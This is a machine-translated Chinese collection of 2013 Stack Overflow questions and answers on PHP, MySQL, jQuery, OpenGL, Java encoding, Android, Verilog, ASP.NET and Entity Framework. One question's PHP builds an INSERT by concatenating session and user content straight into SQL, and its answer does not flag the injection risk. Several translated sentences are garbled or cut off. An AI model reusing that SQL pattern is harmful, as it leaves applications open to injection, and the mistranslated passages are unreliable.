> 时间：2013-04-02T20:16:08.390

您可以使用 php 内置函数`simplexml_load_string`与`file_get_contents`.

这两个函数所做的是将 url xml 提要转换为字符串，然后创建一个对象存储到`$xml`.

资源[文件_get_contents](http://php.net/manual/en/function.file-get-contents.php)

资源[simplexml_load_string](http://www.php.net/manual/en/function.simplexml-load-string.php)

```
$url = 'yourXMLfeed.xml';
$xml = file_get_contents($url);
$xml = simplexml_load_string($xml); 
```

然后，您可以像这样访问您的数据`<name></name>`，等等：

`echo $xml->name`将打印`name`标签内的数据。

如果你有一个嵌套的 xml 提要，你也可以`foreach`像这样使用：

```
foreach($xml as $x):
 echo $x->name
endforeach; 
```

## 编辑

假设您`<tool></tool>`拥有的每个数据，即：

`<tool>Wrench</tool> <tool>Hammer</tool> <tool>Screwdriver</tool>`

你可以做一个快速`foreach`循环来获取数据，如下所示：

```
foreach($xml->category[1] as $tool) {
    echo $tool.' ';
} 
```

这将与扳手锤螺丝刀相呼应

# mysql - from_user_id 不能为空？

> ID：15772178
> 
> 赞同：0
> 
> 时间：2013-04-02T18:59:04.307
> 
> 标签：mysql

我正在尝试使我的 sql 插入函数更安全，目前它说 insert $_SESSION['user_id'] as from_user_id，但我也注意到用户能够破解它并将 from_user_id 设置为 0 或 NULL，我想添加一个条件，基本上说 insert $session['user_id'] into from_user_id 但不允许 from_user_id 为 NULL 否则不要插入并给出错误：

```
 $sql = "INSERT INTO ptb_wallposts (id, from_user_id, to_user_id, content) VALUES (NULL, '".$_SESSION['user_id']."', '".$profile_id."', '".$content."');";
    mysql_query($sql, $connection); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:11:48.340

您还可以将数据库字段设置为 NOT NULL。

# jquery - JQuery.Ajax 发出不需要的多个请求

> ID：15772179
> 
> 赞同：0
> 
> 时间：2013-04-02T18:59:04.530
> 
> 标签：jquery, ajax, onsubmit

我有一个带有文本框和提交按钮的非常基本的表单。该表单应该接受电子邮件并通过 ajax 请求将其发送到 PHP 页面进行处理。该表单实际上并未提交。相反，onSubmit 事件用于调用一个函数，如果电子邮件的格式有效，则在该函数中发出 Ajax 请求。但是，我看到（通过日志）向 PHP 页面发出了多个请求，但我不知道为什么。以下是我检查/尝试过的一些潜在原因：

*   多次调用 post_email() 函数 - 除了在 onSubmit 事件中之外，不调用其他任何地方
*   用户多次单击 - 可能是可能的，但某些 Ajax 调用之间的间隔在 10 分之一秒内。我正在确认这一点，因为在 PHP 页面中，我正在记录每个请求
*   网站内正在加载多个版本的 jQuery（遗留代码）。我的想法是为每个加载的版本进行 .ajax 调用。但是，我在每个 ajax 调用中添加了 jQuery.fn.jquery 数据字符串，并且此页面上只使用了一个版本

这是我正在使用的代码：

代码

```
<form id="post_em" name="post_em" method="post" onSubmit="return post_email()">
    <h3>enter e-mail:</h3>
    <input type="text" id="email" name="email" />
    <input type="submit" value="submit" />
    <div id="em_response"></div>
</form> 
```

JS代码

```
function post_email() {
    if(isValidEmailAddress(jQuery("#email").val()))
    {
        var optincurlurl = "opt_in.php";
        var dataString = jQuery("#post_em").serialize();

        jQuery.ajax({
            url: optincurlurl,
            type: 'POST',
            data: dataString+"&jQuery="+jQuery.fn.jquery,
            datatype: "text",
            timeout: 3600,
            error: function(){
                jQuery("#em_response").html("Error.");
                jQuery("#em_response").show();
            },
            success: function(data){
                jQuery("#em_response").html(data);
                jQuery("#em_response").show();
            }
        });

    } else
        alert("invalid email.");

    return false;
} 
```

如果您发现多次调用 Ajax 的任何潜在原因，请告诉我。

谢谢。

# c++ - 如何在没有着色器的情况下创建现代程序？

> ID：15772181
> 
> 赞同：-2
> 
> 时间：2013-04-02T18:59:10.117
> 
> 标签：c++, opengl

我创建了一个使用旧函数（顶点指针）的程序，我想用现代函数让它更快。
我认为我应该创造一个纯粹的、新的，但我想在我创造一个新的之前我可以在这里问这个问题。
我试图替换其中一个绘图函数，其他的也出错了！

初始化函数：

```
glGenBuffers(10,vbo);
glBindBuffer(GL_ARRAY_BUFFER,vbo[0]);
glBufferData(GL_ARRAY_BUFFER,sizeof(float)*vertSize,vert,GL_DYNAMIC_DRAW);
glBindBuffer(GL_ARRAY_BUFFER,vbo[1]);
glBufferData(GL_ARRAY_BUFFER,sizeof(float)*normalsSize,normals,GL_DYNAMIC_DRAW);
glGenVertexArrays(1,&vao);
glBindVertexArray(vao);
glEnableVertexAttribArray(pSlot);
glEnableVertexAttribArray(nSlot);
glBindBuffer(GL_ARRAY_BUFFER,vbo[0]);
glVertexAttribPointer(pSlot,3,GL_FLOAT,GL_FALSE,0,0);
glBindBuffer(GL_ARRAY_BUFFER,vbo[1]);
glVertexAttribPointer(nSlot,3,GL_FLOAT,GL_FALSE,0,0); 
```

我对画法没有概念...

我应该使用这些：

```
glBindAttribLocation(prog, pSlot, "inVer");
glBindAttribLocation(prog, nSlot, "inNorm"); 
```

但它需要一个`prog`参数。

问题是如果我使用着色器，我应该重写整个程序，如果我错了，请告诉我，如何在不为投影矩阵、模型视图矩阵创建制服的情况下创建着色器，并直接使用矩阵堆栈。

那么我应该使用什么最新的东西来只创建初始化函数来改变绘图函数，而不是使用着色器呢？如果这是可用的，pSlot 和 nSlot 的值是多少？（我认为是 0 和 2，因为着色器中旧的 gl_Vertex 和 gl_normal （或类似的东西）使用这些数字）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:40:23.733

如果您忽略着色器，那么您将被 3.0 之前的顶点属性（位置、颜色、法线、texcoords、颜色索引）困住。您应该使用`glVertexPointer`,和家庭`glColorPointer`，`glNormalPointer`而不是通用的`glVertexAttribPointer`。您无需使用，`glBindAttribLocation`因为通用（编号）属性适用于着色器。

您已经在使用缓冲区对象，这对性能非常有利。

绘图函数 (glDrawArrays*, gl(Multi)DrawElements*) 对于固定函数和 . 兼容性配置文件应该让您摆脱固定功能并仍然使用 GL3 功能，如实例化。

为什么要这样做？我不知道; 着色器简化了很多...

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T19:41:50.170

我以为其他人会给出官方答案。但这里是：

**不，你不能使用没有着色器的现代（可编程）OpenGL。**

# java - 占 6 个字节的字符

> ID：15772184
> 
> 赞同：6
> 
> 时间：2013-04-02T18:59:18.583
> 
> 标签：java, oracle, character-encoding

我们正在尝试保存下面的字符串，它实际上是数据库中的一个名称，我们进行了一些 api 调用，我们得到了这个名称：

株式会社エス・ダブリュー・コミュニケーションズ</p>

在通过我们的代码保存时（如在 servlet - hibernate - 数据库中），我们得到一个错误：

```
Caused by: java.sql.BatchUpdateException: ORA-12899: value too large for column "NAME_ON_ACCOUNT" (actual: 138, maximum: 100) 
```

这是 23 个字符，但看起来每个字符占用 6 个字节，这只会使它成为 138 个。

下面的代码给了我69：

```
byte[] utf8Bytes = string.getBytes("UTF-8");    
System.out.println(utf8Bytes.length); 
```

这给了我 92：

```
byte[] utf8Bytes = string.getBytes("UTF-32");
System.out.println(utf8Bytes.length); 
```

我肯定会检查`NLS_CHARACTERSET`并查看 IO 类，但你见过一个占用 6 个字节的字符吗？任何帮助都感激不尽。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:37:02.710

它可能将 HTML 实体保存在一个字符串中。喜欢`&#29123;`或可能是 URL 样式，`%8C%9A`. 或者也许是 UTF7，比如`[Ay76b`. （我编造了这些值，但您的实际值将是相似的）。依赖任何具有字符编码的框架总是很痛苦，因为它的作者可能是美国或欧洲人，两者都足以满足一个字节等于一个字符的简单 ANSI。如果您设法理解您的编码并将其转换为真正的 UTF8 甚至 UTF16，那么在这种特殊情况下占用的空间会更少。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T10:29:11.353

你可能真的有：

```
\u682a\u5f0f\u4f1a\u793e\u30a8\u30b9\u30fb\u30c0\u30d6\u30ea\u30e5\u30fc\u30fb\u30b3\u30df\u30e5\u30cb\u30b1\u30fc\u30b7\u30e7\u30f3\u30ba 
```

看：

```
"\u682a\u5f0f\u4f1a\u793e\u30a8\u30b9\u30fb\u30c0\u30d6\u30ea\u30e5\u30fc\u30fb\u30b3\u30df\u30e5\u30cb\u30b1\u30fc\u30b7\u30e7\u30f3\u30ba".length();
//23, or 69 UTF-8 bytes 
```

对比：

```
"\\u682a\\u5f0f\\u4f1a\\u793e\\u30a8\\u30b9\\u30fb\\u30c0\\u30d6\\u30ea\\u30e5\\u30fc\\u30fb\\u30b3\\u30df\\u30e5\\u30cb\\u30b1\\u30fc\\u30b7\\u30e7\\u30f3\\u30ba".length();
//138, or 138 UTF-8 bytes 
```

# javascript - 来自外部文件的画布脚本

> ID：15772188
> 
> 赞同：0
> 
> 时间：2013-04-02T18:59:28.443
> 
> 标签：javascript, canvas

我的 HTML5 代码中有一个简单的 Canvas 元素，并尝试使用外部 javascript 文件在其中绘制。

```
<script src="script.js" type="text/javascript"></script>
<canvas id="can1" width="50px" height="50px"></canvas>

//script.js:
var can1 = document.getElementById("play");
var can1Context = play.getContext("2d");
can1Context.fillStyle="#FF0000";
can1Context.fillRect(0,0,150,75); 
```

但这不起作用，但如果脚本与 Canvas Element 位于同一文件中，则它可以工作。有人可以向我解释一下吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:04:12.523

将其更改为

```
<canvas id="play" width="50px" height="50px"></canvas>
<!--        ^^^^ notice the different id -->
<script src="script.js" type="text/javascript"></script> 
```

```
var can1 = document.getElementById("play");
var can1Context = can1.getContext("2d");
//                ^^^^ use the variable here, not the id!
can1Context.fillStyle="#FF0000";
can1Context.fillRect(0,0,150,75); 
```

请参阅[为什么 jQuery 或诸如`getElementById`找不到元素之类的 DOM 方法？](https://stackoverflow.com/q/14028959/1048572)解释一下。

# android - Android App Activity 中的 case 语句跳过

> ID：15772189
> 
> 赞同：0
> 
> 时间：2013-04-02T18:59:25.527
> 
> 标签：android, case

以下`case`语句正在跳过：

```
switch(event.getAction()) {
    case MotionEvent.ACTION_DOWN:
    ButtonFeedback.vibrate(20);
    Log.d("ClientActivity", "Down");

    case MotionEvent.ACTION_UP:
    ButtonFeedback.vibrate(20);
    Log.d("ClientActivity", "up"); 
```

日志中的结果是“向下”“向上”触摸并按住按钮时应该只有“向下”，当不触摸按钮时只有“向上”，这是正确的。

这里有什么遗漏吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:02:07.580

您需要添加中断语句。否则下一个案例也将被执行。

```
switch(event.getAction()) {
    case MotionEvent.ACTION_DOWN:
        ButtonFeedback.vibrate(20);
        Log.d("ClientActivity", "Down");
        break; // you forgot this break here
    case MotionEvent.ACTION_UP:
        ButtonFeedback.vibrate(20);
        Log.d("ClientActivity", "up");
        break; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T19:01:35.453

你错过了`break`，

案件结束后打电话休息

IE

```
 switch(event.getAction()) {

     case MotionEvent.ACTION_DOWN:
       ButtonFeedback.vibrate(20);
  Log.d("ClientActivity", "Down");
    break;

         case MotionEvent.ACTION_UP:
           ButtonFeedback.vibrate(20);
  Log.d("ClientActivity", "up");
      break; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-02T19:02:14.840

尝试：

```
switch(event.getAction()) {
case MotionEvent.ACTION_DOWN:
    ButtonFeedback.vibrate(20);
    Log.d("ClientActivity", "Down");
break;
    case MotionEvent.ACTION_UP:
    ButtonFeedback.vibrate(20);
break; 
```

通过省略该`break;`语句，您创建了一个fallthrough switch case，当 ACTION_DOWN 发生时，您的两个 case 都会执行。

# c# - 在 WebMatrix 中使用缓存是用户特定的还是应用程序特定的？

> ID：15772190
> 
> 赞同：4
> 
> 时间：2013-04-02T18:59:36.990
> 
> 标签：c#, caching, webmatrix, asp.net-webpages

如果我使用`AppState`变量而不是`Session`变量，我就不会专门​​存储用户数据。也就是说，如果一个用户更改了一个`AppState`变量，它对于站点上的所有用户都保持更改（它是特定于应用程序的）。

我的问题是，如果我使用缓存存储值以在 asp.net 网页之间传输数据，它是特定于用户的还是特定于应用程序的？我一直认为它是特定于用户的，但是我读到了这个：

> 缓存主要用于提高网页的性能，因为您可以向其中添加任意对象并随意检索它。缓存项存储在服务器的内存中，可以认为是特殊的全局变量。

（这来自： http: [//www.mikesdotnetting.com/Article/192/Transferring-Data-Between-ASP.NET-Web-Pages](http://www.mikesdotnetting.com/Article/192/Transferring-Data-Between-ASP.NET-Web-Pages)）

知道实际值存储在服务器上后，我开始怀疑对这些值的引用是存储在客户端（如 Session 变量）还是 100% 存储在服务器端。

我自己会对此进行测试，但我的工作环境并不适合我很容易地在不同的机器上“跳跃”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-03T12:32:17.653

缓存不是用户特定的。它类似于`AppState`，除了您可以设置缓存中项目的过期时间，并建立依赖关系，例如在文件或 SQL Server 数据库上（尽管您不能通过`System.Web.Helpers.WebCache`帮助程序完成最后一部分）。

# python - 字典和元组

> ID：15772193
> 
> 赞同：0
> 
> 时间：2013-04-02T18:59:47.857
> 
> 标签：python, dictionary

如果我有一个字典，其中键为元组，值为 int .. 即`x = {('G', 'N', 'L', 'C'): 4}`，我如何告诉 python 键的第一个元素等于值 .. 那么，`'G' = 4`？有没有办法我可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:08:46.493

听起来你想形成一个新的`dict`：

```
In [40]: x = {('G', 'N', 'L', 'C'): 4}

In [41]: y = {key[0]:val for key,val in x.iteritems()}

In [42]: y
Out[42]: {'G': 4} 
```

* * *

这是另一种方式，它使用较少的 Python 风吹草动。首先请注意，您可以遍历字典中的 (key, value) 对：

```
x = {('G', 'N', 'L', 'C'): 4}
for key in x:
    print(key)
    print(x[key]) 
```

产量

```
('G', 'N', 'L', 'C')
4 
```

因此，您可以定义一个新的 dict 关联`'G'`如下`4`：

```
x = {('G', 'N', 'L', 'C'): 4}
y = {}
for key in x:
    y[key[0]] = x[key]

print(y)    
# {'G': 4} 
```

* * *

该表达式`{key[0]:val for key,val in x.iteritems()}`的作用与上面的 for 循环完全相同。它被称为[字典理解](http://docs.python.org/3.3/tutorial/datastructures.html#dictionaries)（在页面下方搜索“字典理解”）。

该表达式还使用[iteritems 方法](http://docs.python.org/2/library/stdtypes.html#dict.iteritems)，该方法在每次通过循环时为您提供一个键和一个值，而不仅仅是键。

# java - 在客户端使用 JavaScript 访问 Java servlet 请求

> ID：15772196
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:00:00.530
> 
> 标签：java, javascript, servlets, request

大家好，我正在尝试使用 java 脚本访问转发的请求，双方的代码部分如下所示：

客户端

```
function addRow() {
var numRows = document.getElementById("request").getAttributeNode("numOfExt");
var table = document.getElementByName("extensionTable");

var allExtensions = new Array();
allExtensions = document.getElementById("request").getAttributeNode("extensions");

for ( var i = 0; i < numRows; i++) {
    var row = table.insertRow(i);
    var cell1 = row.insertCell();
    cell1.innerHTML = allExtensions[i];
}
} 
```

小服务程序

```
request.setAttribute("numOfExt", extensionHandler.getExtensions()
            .size());
request.setAttribute("extensions", extensionHandler.getExtensions()
            .toString());

// forward the httpServlet
getServletContext().getRequestDispatcher("/index.jsp").forward(request,
            response); 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:04:15.710

您只需要记住有一个表单（隐藏）或在您的页面中包含一个操作：

```
<form name="formname" action="servlet" method="post">
    <input type="hidden" name="someParam">
</form> 
```

然后从您的 javascript 调用您的 servlet：

```
document.formname.someParam.value = "hello world";
document.formname.submit(); 
```

最好的祝福。

# verilog - 触发器中同步和异步复位的区别

> ID：15772197
> 
> 赞同：3
> 
> 时间：2013-04-02T19:00:01.953
> 
> 标签：verilog, flip-flop

```
always @ (posedge clk or negedge reset )
begin
//Asynchrous FF
end

always @(posedge clk)
begin
if (reset)
// Synchronous FF
end 
```

以下实现有什么区别？我的意思是 FF 的大小数量。合成器为何以及如何合成它们？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:50:44.777

异步重置意味着您的库中有一个实际具有异步清除（或异步设置）输入的 FF。这些往往比没有这些输入的 FF 稍大，但这会因您的库而异。这些功能使得一旦休息信号被断言，FF 的 Q 将呈现复位状态。

同步复位将通过在 FF 的 D 输入的扇入锥中包含复位信号来实现。这意味着当复位被断言时，它将在时钟的下一个有效沿之前生效。

确切地说，当您应该使用一个而不是另一个时，这是一个广泛的主题。

# jquery - 防止视差向后退

> ID：15772202
> 
> 赞同：3
> 
> 时间：2013-04-02T19:00:08.797
> 
> 标签：jquery, scroll, parallax

大家好，我正在处理这个片段[http://jsfiddle.net/arobichaux/Qbrv9/29/](http://jsfiddle.net/arobichaux/Qbrv9/29/)，我基本上遇到了一些问题。

首先，我希望它不能超过照片的开头（不能滚动到左​​边：0px；），而且我想知道什么是确保实时鼠标移动长度的好方法区域会将它们一直带到图像的末尾？图像宽 5464 像素。

有什么建议么？谢谢！

```
var strength1 = 1000;
var strength2 = 2000;
var strength3 = 5000;
$("html").mousemove(function(e){
    var pageX = e.pageX - ($(window).width() / 15);
    var pageY = e.pageY - ($(window).height() / 1);
    var newvalueX = 2* pageX * -1;
    var newvalueY = 1* pageY * -1;
  $('#background').css("background-position", (strength1 / $(window).width() * pageX * -1)+"px "+(strength1  / $(window).height() * pageY * -1)+"px");
    $('#middleground').css("background-position", (strength2 / $(window).width() * pageX * -1)+"px "+(1  / $(window).height() * pageY * -1)+"px");
    $('#foreground').css("background-position", (strength3 / $(window).width() * pageX * -1)+"px "+(1 / $(window).height() * pageY * -1)+"px");
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:11:05.840

**[jsFiddle 演示](http://jsfiddle.net/Qbrv9/30/)**

首先，对于第一次使用的用户来说，这是一个非常好的问题。小提琴很好地呈现，我认为视差正变得越来越流行和相关。

我将解决两个问题，在我看来它们是次要的（您的代码工作得相当好 - 干得好）。

**没有滚动到左边：0px；**

这很简单，只需在计算后更改检查`pageX`，如果小于 0，则将其设置为 0。非常简单的碰撞检测。

```
var pageX = e.pageX - ($(window).width() / 15);
if( pageX < 0 ) pageX = 0; 
```

**将它们一直带到图像的末尾**

此问题源于您将区域的宽度设置为小于图像宽度。值得注意的是，你的小提琴列表`strength3 = 5000`应该是

```
var strength3 = 5464; 
```

# asp.net - 如何在不要求用户输入域名的情况下使用 Active Directory 身份验证？

> ID：15772207
> 
> 赞同：0
> 
> 时间：2013-04-02T19:00:17.557
> 
> 标签：asp.net, vb.net, active-directory, login-control

现在，我在 Web 应用程序上进行了 Active Directory 身份验证。用户使用其 AD 凭据登录。他们必须输入他们的广告凭据，例如：

> myname@ourdomain.com

我希望他们能够输入他们的广告凭据，例如：

> 我的名字

这可能吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-07T06:33:02.137

这是我做的工作

将您的登录控件更改为模板

然后添加此代码

```
 Protected Sub LoginButton_Click(sender As Object, e As System.EventArgs)
    If Not UCase(LoginUser.UserName).EndsWith("@MYDOMAIN.LOCAL") Then
        LoginUser.UserName &= "@MYDOMAIN.local"
    End If
End Sub 
```

或者

在您的 web.config 添加：

```
 attributeMapUsername="SAMAccountName" to your provider 
```

所以看起来像

```
 <membership defaultProvider="MyADMembershipProvider">
  <providers>
    <add
       name="MyADMembershipProvider"
       type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
       connectionStringName="ADConnectionString"
       connectionUsername="MYDOMAIN\administrator"
       connectionPassword="MYPASSWORD"
       enableSearchMethods="true"
       attributeMapUsername="SAMAccountName"/>
  </providers>
</membership> 
```

# database - \r\n 在数据库不接受的字符串中

> ID：15772211
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:00:29.913
> 
> 标签：database, oledb, foxpro, dbf

我为 Update SQL 命令创建了一个字符串变量，以便将此命令执行到 dbf 文件（使用 OleDb）。

当我的 SQL 命令包含在字符串 \r\n 中时，不接受 SqlCommand :(

**这是我的 SQL 命令的示例：**

```
update ZZAg7eve set evenotes = 'line1\r\nline2' where eveNum = '00000003' 
```

我知道问题是\r\n。我尝试使用逐字记录，但总是出现相同的错误：“命令包含无法识别的短语/关键字”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T21:28:12.273

在 VFP 中，您使用 CHR(13) + CHR(10) 来表示 CRLF。所以试试：

```
update ZZAg7eve set evenotes = 'line1' + chr(13) + chr(10) + 'line2' where eveNum = '00000003' 
```

# php - Wordpress - get_search_form() 与图标在同一行

> ID：15772221
> 
> 赞同：0
> 
> 时间：2013-04-02T19:01:11.800
> 
> 标签：php, wordpress, css, wordpress-theming

我想在我的搜索表单的同一行显示几个图标。它真的很想独树一帜。我最初将它添加为表单，而不是通过 php 调用它，但我希望它更动态，如您所见。如果不添加表格就不可能做到这一点吗？

这是一个精简的示例：

老办法：

```
<div> 
<a href="#"><img src="#"></a>
<a href="#"><img src="#"></a>
<form><input type="text"></form>
<a href="#"><img src="#"></a>
<a href="#"><img src="#"></a>
</div> 
```

新的方法：

```
<div> 
<a href="#"><img src="#"></a>
<a href="#"><img src="#"></a>
<?php get_search_form(); ?> 
<a href="#"><img src="#"></a>
<a href="#"><img src="#"></a>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:21:28.523

您应该看到 searchform.php 并检查 style.css 中此表单的样式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:57:28.923

在我的 searchform.php 中有一个元素。

我只是添加了 display:inline; 到表格制作：

```
<form style="display:inline;"> 
```

现在所有内容都显示在一行上。

![在此处输入图像描述](https://i.stack.imgur.com/SEfHq.jpg)

# f# - 奇怪的无限循环中的F#递归函数

> ID：15772228
> 
> 赞同：3
> 
> 时间：2013-04-02T19:01:43.140
> 
> 标签：f#, f#-interactive

当谈到 F# 时，我非常陌生，并且我遇到了一个处理递归函数的小问题，我希望它可以帮助我理解。

我有一个应该吐出下一个偶数的函数：

```
let rec nextEven(x) =
    let y = x + 1
    if y % 2 = 0 then y
    else nextEven y

// This never returns..
nextEven 3;; 
```

我使用 'rec' 关键字，以便它是递归的，尽管当我使用它时，它会出于某种原因在无限循环中运行。如果我像这样重写函数：

```
let nextEven(x) =
    let y = x + 1
    if y % 2 = 0 then y
    else nextEven y 
```

然后一切正常（没有 rec 关键字）。出于某种原因，我虽然需要'rec'，因为该函数是递归的（那我为什么不呢？）为什么该函数的第一个版本会永远运行？

**编辑**
原来这是一个完全的菜鸟错误。正如评论+答案中所解释的那样，我一路创建了函数的多个定义。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T19:13:56.647

我怀疑您对`nextEven`. 这是您的第二个示例编译的唯一解释。复制：

```
module A =
  let rec nextEven(x) =
    let y = x + 1
    if y % 2 = 0 then y
    else nextEven y

open A //the function below will not compile without this

let nextEven(x) =
    let y = x + 1
    if y % 2 = 0 then y
    else nextEven y //calling A.nextEven 
```

尝试重置您的 FSI 会话。

# servlets - 为什么我的过滤器在第二次请求 URL 时没有被调用？

> ID：15772233
> 
> 赞同：0
> 
> 时间：2013-04-02T19:02:01.133
> 
> 标签：servlets, servlet-filters

当我第一次通过浏览器输入 url 时，我的 servlet 过滤器被命中。例如，`appPages/Nav.xhtml?id=1`第一次在浏览器中粘贴确实会刷新页面。现在，当我将查询字符串更改为`appPages/Nav.xhtml?id=2`也刷新页面时。

但是我第三次进入`appPages/Nav.xhtml?id=1`它仍然记得旧阶段并且我的过滤器从未被调用过。在我的 web.xml 中，我将过滤器配置为

```
<filter>
    <display-name>SearchParamsFilter</display-name>
    <filter-name>SearchParams</filter-name>
    <filter-class>com.acme.filter.SearchParams</filter-class>
</filter>
<filter-mapping>
     <filter-name>SearchParams</filter-name>
     <url-pattern>/appPages/Nav.xhtml</url-pattern>
 </filter-mapping> 
```

为什么要记住旧的状态？仅当我再次在同一选项卡同一窗口中输入 url 时才会发生这种情况。但是重新加载工作正常。

更新：它在 Chrome 上运行良好，但在 IE 上不行！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:19:18.397

它可能是由客户端缓存引起的。确保通过在 servlet 和/或过滤器中设置适当的响应标头来禁用缓存。有关详细说明，请参阅以下答案：

[如何防止 Servlet 的结果被缓存？](https://stackoverflow.com/questions/5139785/how-to-prevent-the-result-of-servlets-from-being-cached)

[Java servlet如何禁用页面缓存](https://stackoverflow.com/questions/3976624/java-servlet-how-to-disable-caching-of-page)

# paypal-sandbox - Paypal 开发者帐户英国

> ID：15772245
> 
> 赞同：1
> 
> 时间：2013-04-02T19:02:43.550
> 
> 标签：paypal-sandbox

我想使用 paypal 沙盒帐户进行一些测试，并且我观看了一个很棒的 youtube 视频。但是当我尝试创建一个开发者帐户时，它在顶部显示只有美国企业可以使用 REST API。我不知道这意味着什么，但该表格是为美国客户设置的，带有邮政编码和 3 位数的电话号码代码。

总而言之，我可以在英国使用这项服务吗？如果有怎么办？我是否只需在美国表格中输入我的详细信息？

任何帮助表示赞赏，

罗宾。

# jquery - jQuery 将元素传递给 dataTransfer 属性

> ID：15772249
> 
> 赞同：12
> 
> 时间：2013-04-02T19:02:54.077
> 
> 标签：jquery, events, object, drag-and-drop, data-transfer

`dataTransfer`尝试在拖放序列期间将jQuery 对象传递给属性。将属性添加到`jQuert.event.props`数组后，我可以分配它，但它在`drop`事件期间返回 undefined on。不确定我在这里缺少什么 - 看起来真的很简单。

Javascript：

```
function dragClip(clip, event){

    event.dataTransfer.el = clip;

    /* Console confirms event.dataTransfer.el is the jQuery object */
}

function dropClip(target, event){

    target.append(event.dataTransfer.el);

    /* event.dataTransfer.el no longer has the object... where'd it go?? */
}

jQuery.event.props.push('dataTransfer');

$('#titles')
    .bind('dragenter dragover', false)
    .bind('drop', function(event){

        dropClip($(this), event);
    });

$('.clip').bind('dragstart', function(event){

    dragClip($(this), event);
}); 
```

* * *

更新：

重写以消除冗长。在那里包含了其他东西，但是一个匿名函数就可以了：

```
jQuery.event.props.push('dataTransfer');

$('#titles')
    .bind('dragenter dragover', false)
    .bind('drop', function(event){

        $(this).append(event.dataTransfer.el);
    });

$('.clip').bind('dragstart', function(event){

    event.dataTransfer.el = $(this);
}); 
```

* * *

更新

根据@barney 的最终答案，我的最终工作代码。我注意到使用原始事件不允许我将对象作为数据传递，因此我应用了 ID 并在放置时重建了 jQuery 对象。还通过摆脱声明的函数来收紧一切。更少的代码，相同的结果。

```
$('#titles')
    .bind('dragenter dragover', false)
    .bind('drop', function(event){

        $(this).append($('#' + event.originalEvent.dataTransfer.getData('clip')));
    });

$('.clip')
    .bind('dragstart', function(event){

        event.originalEvent.dataTransfer.setData('clip', $(this).attr('id'));
    }); 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-04-02T19:33:37.050

就个人而言，我尝试尽可能少地使用 jQuery 内部，并尽可能提取原始事件对象。过去使用拖放时，我一直使用`event.originalEvent.dataTransfer`.

# .net - Entity Framework 4 存储过程调用超时

> ID：15772252
> 
> 赞同：17
> 
> 时间：2013-04-02T19:03:31.453
> 
> 标签：.net, entity-framework, sql-server-2008-r2

我有一个导入 EF4 的存储过程，当我在 30 秒后使用某些参数调用它时，它会引发超时错误。在 SQL Server 探查器中，我可以看到带有正确参数的存储过程调用仅用了 30 多秒，这是我的应用程序的超时时间。

但是，当我在查询分析器中执行发送到探查器的相同 SQL 时，它会在亚秒内执行。什么可能导致从 EF 调用和从 SQL Server Management Studio 调用之间的这种差异？

.NET 错误的完整堆栈跟踪如下。

> [SqlException (0x80131904): 超时。操作完成前超时时间已过或服务器没有响应。]
> System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +2073486
> System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection) +5064444
> System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +234
> System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +2275
> System.Data.SqlClient。 SqlDataReader.ConsumeMetaData() +33
> System.Data.SqlClient.SqlDataReader.get_MetaData() +86
> System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +311
> System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async) +987
> System.Data.SqlClient .SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result) +162
> System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +32
> System.Data。 SqlClient.SqlCommand.ExecuteReader（CommandBehavior 行为，字符串方法）+141
> System.Data.SqlClient.SqlCommand.ExecuteDbDataReader（CommandBehavior 行为）+12
> System.Data.Common.DbCommand.ExecuteReader（CommandBehavior 行为）+10 System.Data.EntityClient.EntityCommandDefinition.ExecuteStoreCommands（EntityCommand entityCommand，CommandBehavior 行为）+443
> 
> [EntityCommandExecutionException：执行命令定义时发生错误。有关详细信息，请参阅内部异常。]
> System.Data.EntityClient.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior) +479
> System.Data.Objects.ObjectContext.CreateFunctionObjectResult(EntityCommand entityCommand, EntitySet entitySet, EdmType edmType, MergeOption mergeOption) +182
> System.Data.Objects.ObjectContext.ExecuteFunction(String functionName, MergeOption mergeOption, ObjectParameter[] parameters) +218
> System.Data.Objects.ObjectContext.ExecuteFunction(String functionName, ObjectParameter[] parameters) +53
